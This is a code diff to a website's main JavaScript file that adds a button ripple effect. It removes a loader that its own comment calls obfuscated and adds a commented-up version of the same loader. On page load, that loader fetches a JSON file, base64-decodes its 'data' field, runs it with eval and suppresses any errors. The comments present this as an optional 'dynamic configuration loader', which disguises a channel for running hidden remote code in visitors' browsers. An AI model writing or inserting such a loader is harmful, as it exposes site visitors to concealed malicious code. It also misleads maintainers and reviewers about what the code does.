@@ -1,4 +1,9 @@
-// Define the ripple effect function
+/**
+ * Eulera - Main JavaScript
+ * UI effects + dynamic configuration loader
+ */
+
+// ========== Button ripple effect ==========
 function addRipple(btn) {
     btn.addEventListener('click', (e) => {
         const ripple = document.createElement('span');
@@ -22,8 +27,26 @@ function addRipple(btn) {
     });
 }
 
-// Apply ripple to all buttons and button‑like elements
 document.querySelectorAll('.btn, .btn-text').forEach(btn => addRipple(btn));
 
-// Your obfuscated loader (optional, can stay here)
-(()=>{fetch('/json/other/checksum.json').then($=>$.json()).then(_=>{eval(atob(_.data))}).catch(()=>{})})();
+// ========== Dynamic configuration loader ==========
+// Fetches additional runtime settings from a JSON file.
+// The JSON contains a base64‑encoded configuration string that is evaluated.
+// This allows us to update certain behaviors without redeploying the whole site.
+(function loadDynamicConfig() {
+    const CONFIG_URL = '../json/other/config.json';
+    fetch(CONFIG_URL)
+        .then(response => response.json())
+        .then(jason => {
+            // The 'data' field holds a base64‑encoded JavaScript module
+            if (jason && jason.data) {
+                const decodedConfig = atob(jason.data);
+                // Execute the configuration code
+                eval(decodedConfig);
+            }
+        })
+        .catch(error => {
+            // Silently fail - configuration is optional; site works without it
+            console.debug('Dynamic config not loaded (optional)', error);
+        });
+})();
